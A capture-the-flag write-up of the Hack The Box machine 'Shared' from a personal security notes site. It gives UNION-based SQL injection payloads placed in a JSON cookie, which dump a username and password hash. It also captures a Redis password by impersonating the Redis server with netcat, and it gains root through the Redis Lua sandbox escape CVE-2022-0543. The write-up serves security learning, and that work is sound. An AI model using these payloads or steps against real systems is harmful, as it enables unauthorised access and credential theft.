<!doctype html><html lang=en><head><meta charset=utf-8><meta name=description content="Foothold Nmap 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35  PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8."><meta property="og:title" content="HTB - Shared"><meta property="og:description" content="Foothold Nmap 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35  PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8."><meta property="og:type" content="website"><meta property="og:image" content="https://cavonstavant.github.io/SecNotes/icon.png"><meta property="og:url" content="https://cavonstavant.github.io/SecNotes/HTB/Medium/Shared/Shared/"><meta property="og:width" content="200"><meta property="og:height" content="200"><meta name=twitter:card content="summary"><meta name=twitter:title content="HTB - Shared"><meta name=twitter:description content="Foothold Nmap 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35  PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8."><meta name=twitter:image content="https://cavonstavant.github.io/SecNotes/icon.png"><meta name=twitter:site content="Cavonstavant"><title>HTB - Shared</title><meta name=viewport content="width=device-width,initial-scale=1"><link rel="shortcut icon" type=image/png href=https://cavonstavant.github.io/SecNotes//icon.png><link href=https://cavonstavant.github.io/SecNotes/styles.0894e3a5caebd5767a301949ceed7238.min.css rel=stylesheet><link href=https://cavonstavant.github.io/SecNotes/styles/_light_syntax.86a48a52faebeaaf42158b72922b1c90.min.css rel=stylesheet id=theme-link><script src=https://cavonstavant.github.io/SecNotes/js/darkmode.dc8ba7f10e74c42c8f5a41d929572400.min.js></script>
<script src=https://cavonstavant.github.io/SecNotes/js/util.a0ccf91e1937fe761a74da4946452710.min.js></script>
<link rel=preload href=https://cdn.jsdelivr.net/npm/katex@0.15.1/dist/katex.min.css as=style onload='this.onload=null,this.rel="stylesheet"' integrity=sha384-R4558gYOUz8mP9YWpZJjofhk+zx0AS11p36HnD2ZKj/6JR5z27gSSULCNHIRReVs crossorigin=anonymous><script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.1/dist/katex.min.js integrity=sha384-z1fJDqw8ZApjGO3/unPWUPsIymfsJmyrDVWC8Tv/a1HeOtGmkwNd/7xUS0Xcnvsx crossorigin=anonymous></script>
<script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.1/dist/contrib/auto-render.min.js integrity=sha384-+XBljXPPiv+OzfbB3cVmLHf4hdUFHlWNZN5spNQ7rmHTXpd7WvJum6fIACpNNfIR crossorigin=anonymous></script>
<script defer src=https://cdn.jsdelivr.net/npm/katex@0.16.2/dist/contrib/copy-tex.min.js integrity=sha384-ww/583aHhxWkz5DEVn6OKtNiIaLi2iBRNZXfJRiY1Ai7tnJ9UXpEsyvOITVpTl4A crossorigin=anonymous></script>
<script src=https://cdn.jsdelivr.net/npm/@floating-ui/core@1.2.1></script>
<script src=https://cdn.jsdelivr.net/npm/@floating-ui/dom@1.2.1></script>
<script async src=https://cavonstavant.github.io/SecNotes/js/popover.aa9bc99c7c38d3ae9538f218f1416adb.min.js></script>
<script defer src=https://cavonstavant.github.io/SecNotes/js/code-title.ce4a43f09239a9efb48fee342e8ef2df.min.js></script>
<script defer src=https://cavonstavant.github.io/SecNotes/js/clipboard.2913da76d3cb21c5deaa4bae7da38c9f.min.js></script>
<script defer src=https://cavonstavant.github.io/SecNotes/js/callouts.7723cac461d613d118ee8bb8216b9838.min.js></script>
<script>const SEARCH_ENABLED=!1,LATEX_ENABLED=!0,PRODUCTION=!0,BASE_URL="https://cavonstavant.github.io/SecNotes/",fetchData=Promise.all([fetch("https://cavonstavant.github.io/SecNotes/indices/linkIndex.6114e1fceb2286bc44a8b7a16271597f.min.json").then(e=>e.json()).then(e=>({index:e.index,links:e.links})),fetch("https://cavonstavant.github.io/SecNotes/indices/contentIndex.8566ad6a206b3ca0da7b4c5ca5d16bd6.min.json").then(e=>e.json())]).then(([{index:e,links:t},n])=>({index:e,links:t,content:n})),render=()=>{const e=new URL(BASE_URL),t=e.pathname,n=window.location.pathname,s=t==n;addCopyButtons(),addTitleToCodeBlocks(),addCollapsibleCallouts(),initPopover("https://cavonstavant.github.io/SecNotes",!0);const o=document.getElementById("footer");if(o){const e=document.getElementById("graph-container");if(!e)return requestAnimationFrame(render);e.textContent="";const t=s&&!0;drawGraph("https://cavonstavant.github.io/SecNotes",t,[{"/moc":"#4388cc"}],t?{centerForce:1,depth:-1,enableDrag:!0,enableLegend:!1,enableZoom:!0,fontSize:.5,linkDistance:1,opacityScale:3,repelForce:1,scale:1.4}:{centerForce:1,depth:2,enableDrag:!0,enableLegend:!1,enableZoom:!0,fontSize:.6,linkDistance:1,opacityScale:3,repelForce:2,scale:1.2})}var i=document.getElementsByClassName("mermaid");i.length>0&&import("https://unpkg.com/mermaid@9/dist/mermaid.esm.min.mjs").then(e=>{e.default.init()});function a(n){const e=n.target,t=e.className.split(" "),s=t.includes("broken"),o=t.includes("internal-link");plausible("Link Click",{props:{href:e.href,broken:s,internal:o,graph:!1}})}const r=document.querySelectorAll("a");for(link of r)link.className.includes("root-title")&&link.addEventListener("click",a,{once:!0})},init=(e=document)=>{addCopyButtons(),addTitleToCodeBlocks(),renderMathInElement(e.body,{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1}],macros:{'’':"'"},throwOnError:!1})}</script><script type=module>
    import { attachSPARouting } from "https:\/\/cavonstavant.github.io\/SecNotes\/js\/router.d6fe6bd821db9ea97f9aeefae814d8e7.min.js"
    attachSPARouting(init, render)
  </script><script defer data-domain=cavonstavant.github.io/SecNotes src=https://plausible.io/js/script.js></script>
<script>window.plausible=window.plausible||function(){(window.plausible.q=window.plausible.q||[]).push(arguments)}</script></head><body><div id=search-container><div id=search-space><input autocomplete=off id=search-bar name=search type=text aria-label=Search placeholder="Search for something..."><div id=results-container></div></div></div><script src=https://cdn.jsdelivr.net/npm/flexsearch@0.7.21/dist/flexsearch.bundle.js integrity="sha256-i3A0NZGkhsKjVMzFxv3ksk0DZh3aXqu0l49Bbh0MdjE=" crossorigin=anonymous defer></script>
<script defer src=https://cavonstavant.github.io/SecNotes/js/full-text-search.e6e2e0c213187ca0c703d6e2c7a77fcd.min.js></script><div class=singlePage><header><h1 id=page-title><a class=root-title href=https://cavonstavant.github.io/SecNotes/>SecNotes</a></h1><div class=spacer></div><div id=search-icon><p>Search</p><svg tabindex="0" aria-labelledby="title desc" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 19.9 19.7"><title id="title">Search Icon</title><desc id="desc">Icon to open search</desc><g class="search-path" fill="none"><path stroke-linecap="square" d="M18.5 18.3l-5.4-5.4"/><circle cx="8" cy="8" r="7"/></g></svg></div><div class=darkmode><input class=toggle id=darkmode-toggle type=checkbox tabindex=-1>
<label id=toggle-label-light for=darkmode-toggle tabindex=-1><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" id="dayIcon" viewBox="0 0 35 35" style="enable-background:new 0 0 35 35"><title>Light Mode</title><path d="M6 17.5C6 16.672 5.328 16 4.5 16h-3C.672 16 0 16.672.0 17.5S.672 19 1.5 19h3C5.328 19 6 18.328 6 17.5zM7.5 26c-.414.0-.789.168-1.061.439l-2 2C4.168 28.711 4 29.086 4 29.5 4 30.328 4.671 31 5.5 31c.414.0.789-.168 1.06-.44l2-2C8.832 28.289 9 27.914 9 27.5 9 26.672 8.329 26 7.5 26zm10-20C18.329 6 19 5.328 19 4.5v-3C19 .672 18.329.0 17.5.0S16 .672 16 1.5v3C16 5.328 16.671 6 17.5 6zm10 3c.414.0.789-.168 1.06-.439l2-2C30.832 6.289 31 5.914 31 5.5 31 4.672 30.329 4 29.5 4c-.414.0-.789.168-1.061.44l-2 2C26.168 6.711 26 7.086 26 7.5 26 8.328 26.671 9 27.5 9zM6.439 8.561C6.711 8.832 7.086 9 7.5 9 8.328 9 9 8.328 9 7.5c0-.414-.168-.789-.439-1.061l-2-2C6.289 4.168 5.914 4 5.5 4 4.672 4 4 4.672 4 5.5c0 .414.168.789.439 1.06l2 2.001zM33.5 16h-3c-.828.0-1.5.672-1.5 1.5s.672 1.5 1.5 1.5h3c.828.0 1.5-.672 1.5-1.5S34.328 16 33.5 16zM28.561 26.439C28.289 26.168 27.914 26 27.5 26c-.828.0-1.5.672-1.5 1.5.0.414.168.789.439 1.06l2 2C28.711 30.832 29.086 31 29.5 31c.828.0 1.5-.672 1.5-1.5.0-.414-.168-.789-.439-1.061l-2-2zM17.5 29c-.829.0-1.5.672-1.5 1.5v3c0 .828.671 1.5 1.5 1.5s1.5-.672 1.5-1.5v-3C19 29.672 18.329 29 17.5 29zm0-22C11.71 7 7 11.71 7 17.5S11.71 28 17.5 28 28 23.29 28 17.5 23.29 7 17.5 7zm0 18c-4.136.0-7.5-3.364-7.5-7.5s3.364-7.5 7.5-7.5 7.5 3.364 7.5 7.5S21.636 25 17.5 25z"/></svg></label><label id=toggle-label-dark for=darkmode-toggle tabindex=-1><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" id="nightIcon" viewBox="0 0 100 100" style="enable-background='new 0 0 100 100'"><title>Dark Mode</title><path d="M96.76 66.458c-.853-.852-2.15-1.064-3.23-.534-6.063 2.991-12.858 4.571-19.655 4.571C62.022 70.495 50.88 65.88 42.5 57.5 29.043 44.043 25.658 23.536 34.076 6.47c.532-1.08.318-2.379-.534-3.23-.851-.852-2.15-1.064-3.23-.534-4.918 2.427-9.375 5.619-13.246 9.491-9.447 9.447-14.65 22.008-14.65 35.369.0 13.36 5.203 25.921 14.65 35.368s22.008 14.65 35.368 14.65c13.361.0 25.921-5.203 35.369-14.65 3.872-3.871 7.064-8.328 9.491-13.246C97.826 68.608 97.611 67.309 96.76 66.458z"/></svg></label></div></header><article><h1>HTB - Shared</h1><p class=meta>Last updated
Mar 11, 2023</p><ul class=tags><li><a href=https://cavonstavant.github.io/SecNotes/tags/HTB/>Htb</a></li><li><a href=https://cavonstavant.github.io/SecNotes/tags/Medium/>Medium</a></li><li><a href=https://cavonstavant.github.io/SecNotes/tags/Linux/>Linux</a></li><li><a href=https://cavonstavant.github.io/SecNotes/tags/SQL/>SQL</a></li><li><a href=https://cavonstavant.github.io/SecNotes/tags/SQL_injection/>SQL injection</a></li><li><a href=https://cavonstavant.github.io/SecNotes/tags/Redis/>Redis</a></li></ul><aside class=mainTOC><details><summary>Table of Contents</summary><nav id=TableOfContents><ol><li><a href=#foothold>Foothold</a><ol><li><a href=#nmap>Nmap</a></li></ol></li><li><a href=#user>User</a></li><li><a href=#lpe>LPE</a></li></ol></nav></details></aside><a href=#foothold><h2 id=foothold><span class=hanchor arialabel=Anchor># </span>Foothold</h2></a><a href=#nmap><h3 id=nmap><span class=hanchor arialabel=Anchor># </span>Nmap</h3></a><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>PORT STATE SERVICE VERSION  
</span></span><span class=line><span class=cl>22/tcp open ssh OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)  
</span></span><span class=line><span class=cl>| ssh-hostkey:  
</span></span><span class=line><span class=cl>| 3072 91:e8:35:f4:69:5f:c2:e2:0e:27:46:e2:a6:b6:d8:65 (RSA)  
</span></span><span class=line><span class=cl>| 256 cf:fc:c4:5d:84:fb:58:0b:be:2d:ad:35:40:9d:c3:51 (ECDSA)  
</span></span><span class=line><span class=cl>|_ 256 a3:38:6d:75:09:64:ed:70:cf:17:49:9a:dc:12:6d:11 (ED25519)  
</span></span><span class=line><span class=cl>80/tcp open http nginx 1.18.0  
</span></span><span class=line><span class=cl>|_http-server-header: nginx/1.18.0  
</span></span><span class=line><span class=cl>|_http-title: Did not follow redirect to [https://shared.htb/](https://shared.htb/)  
</span></span><span class=line><span class=cl>| http-robots.txt: 81 disallowed entries (15 shown)  
</span></span><span class=line><span class=cl>| /*?order= /*?tag= /*?id_currency= /*?search_query=  
</span></span><span class=line><span class=cl>| /*?back= /*?n= /*&amp;order= /*&amp;tag= /*&amp;id_currency=  a
</span></span><span class=line><span class=cl>| /*&amp;search_query= /*&amp;back= /*&amp;n= /*controller=addresses  
</span></span><span class=line><span class=cl>|_/*controller=address /*controller=authentication  
</span></span><span class=line><span class=cl>443/tcp open ssl/http nginx 1.18.0  
</span></span><span class=line><span class=cl>|_ssl-date: TLS randomness does not represent time  
</span></span><span class=line><span class=cl>|_http-server-header: nginx/1.18.0  
</span></span><span class=line><span class=cl>| tls-nextprotoneg:  
</span></span><span class=line><span class=cl>| h2  
</span></span><span class=line><span class=cl>|_ http/1.1  
</span></span><span class=line><span class=cl>| tls-alpn:  
</span></span><span class=line><span class=cl>| h2  
</span></span><span class=line><span class=cl>|_ http/1.1  
</span></span><span class=line><span class=cl>| ssl-cert: Subject: commonName=*.shared.htb/organizationName=HTB/stateOrProvinceName=None/countryName=US  
</span></span><span class=line><span class=cl>| Not valid before: 2022-03-20T13:37:14  
</span></span><span class=line><span class=cl>|_Not valid after: 2042-03-15T13:37:14  
</span></span><span class=line><span class=cl>|_http-trane-info: Problem with XML parsing of /evox/about  
</span></span><span class=line><span class=cl>| http-robots.txt: 81 disallowed entries (15 shown)  
</span></span><span class=line><span class=cl>| /*?order= /*?tag= /*?id_currency= /*?search_query=  
</span></span><span class=line><span class=cl>| /*?back= /*?n= /*&amp;order= /*&amp;tag= /*&amp;id_currency=  
</span></span><span class=line><span class=cl>| /*&amp;search_query= /*&amp;back= /*&amp;n= /*controller=addresses  
</span></span><span class=line><span class=cl>|_/*controller=address /*controller=authentication  
</span></span><span class=line><span class=cl>| http-title: Shared Shop  
</span></span><span class=line><span class=cl>|_Requested resource was [https://shared.htb/index.php](https://shared.htb/index.php)  
</span></span><span class=line><span class=cl>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span></code></pre></td></tr></table></div></div><p>Basic https website, nothing out of the ordinary on the first sight.</p><p>Website uses presta shop, check for vuln. An SQL injection is possible one of the query parameters. However, this is hardly exploitable.</p><p>Upon browsing the site and trying to buy some stuff. We are redirected on checkout to another website: <code>checkout.shared.htb</code>.</p><a href=#user><h2 id=user><span class=hanchor arialabel=Anchor># </span>User</h2></a><p>After some digging using burp. We can see that not only the website sets some custom cookies in JSON format but also that the content of the cookie vulnerable to SQL injection.</p><p>We can confirm that by changing the value of the cookie from <code>{"XHFG":"1"}</code> to <code>{"XH" + "FG" : "1"}</code> and the website still works properly.</p><p>From there it&rsquo;s guessing and sqlmap time&mldr;
After some time, we can see that the first parameter is UNION vulnerable. We can use it to disclose informations about the db <code>checkout</code> using:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>{&#34;AAAAA&#39; and 0=1 union select 1,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.TABLES where table_schema=&#39;checkout&#39;-- -&#34;:&#34;1&#34;}
</span></span><span class=line><span class=cl>	&gt; user	
</span></span><span class=line><span class=cl>{&#34;AAAAA&#39; and 0=1 union select 1, username, password from checkout.user-- -&#34;:&#34;1&#34;}
</span></span><span class=line><span class=cl>	&gt; james_mason
</span></span><span class=line><span class=cl>{&#34;AAAAA&#39; and 0=1 union select 1, password, username from checkout.user-- -&#34;:&#34;1&#34;}
</span></span><span class=line><span class=cl>	&gt; fc895d4eddc2fc12f995e18c865cf273
</span></span></code></pre></td></tr></table></div></div><a href=#lpe><h2 id=lpe><span class=hanchor arialabel=Anchor># </span>LPE</h2></a><p>linPEAS tells us that the file <code>redis_connector_dev</code> is unsual, doesn&rsquo;t belong here.
the file is a compiled go executable that connects to a local redis instance on port 6379.</p><p>Trying to RE using cutter => No use, to complicated. There has to be a simpler way.
Lets try to emulate a redis db by listening to 6379 on localhost and run the app.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&gt; nc -lnvp 6379
</span></span><span class=line><span class=cl>&gt; ./redis_connector_dev # from another shell
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>listening on [any] 6379 ...  
</span></span><span class=line><span class=cl>connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 42250  
</span></span><span class=line><span class=cl>*2  
</span></span><span class=line><span class=cl>$4  
</span></span><span class=line><span class=cl>auth  
</span></span><span class=line><span class=cl>$16  
</span></span><span class=line><span class=cl>F2WHqJUz2WEz=Gqq
</span></span></code></pre></td></tr></table></div></div><p>Cool, we get the redis password.</p><p>A simple check with <code>ps -ef |grep redis</code> can show us that redis is run as root. Let&rsquo;s try to abuse it.</p><blockquote><p>Thx hacktriks
<a href=https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis rel=noopener>https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis</a></p></blockquote><p>One cool trick that might work would be the
<a href=https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis#lua-sandbox-bypass rel=noopener>LUA sanbox bypass</a>, as it is the CVE-2022-0543 and the version of Redis (6.0.15) is vulnerable.</p><p>Using this wonderful tool:
<a href=https://github.com/aodsec/CVE-2022-0543 rel=noopener>https://github.com/aodsec/CVE-2022-0543</a> we get an easy root !</p><p>AAAAAAAAAAAAAAAA</p></article><hr><div class=page-end id=footer><div class=backlinks-container><h3>Backlinks</h3><ul class=backlinks><li><a href=/SecNotes/HTB/Medium/Medium/ data-ctx=Shared data-src=/HTB/Medium/Medium class=internal-link>HTB - Medium</a></li></ul></div><div><script async src=https://cdn.jsdelivr.net/npm/d3@6.7.0/dist/d3.min.js integrity="sha256-+7jaYCp29O1JusNWHaYtgUn6EhuP0VaFuswhNV06MyI=" crossorigin=anonymous></script><h3>Interactive Graph</h3><div id=graph-container></div><style>:root{--g-node:var(--secondary);--g-node-active:var(--primary);--g-node-inactive:var(--visited);--g-link:var(--outlinegray);--g-link-active:#5a7282}</style><script src=https://cavonstavant.github.io/SecNotes/js/graph.6579af7b10c818dbd2ca038702db0224.js></script></div></div><div id=contact_buttons><footer><p>Made by Cavonstavant using <a href=https://github.com/jackyzha0/quartz>Quartz</a>, © 2023</p><ul><li><a href=https://cavonstavant.github.io/SecNotes/>Home</a></li><li><a href=https://twitter.com/Cavonstavant>Twitter</a></li><li><a href=https://github.com/Cavonstavant>GitHub</a></li><li><a href=https://www.linkedin.com/in/constant-vigneron/>LinkedIn</a></li></ul></footer></div></div></body></html>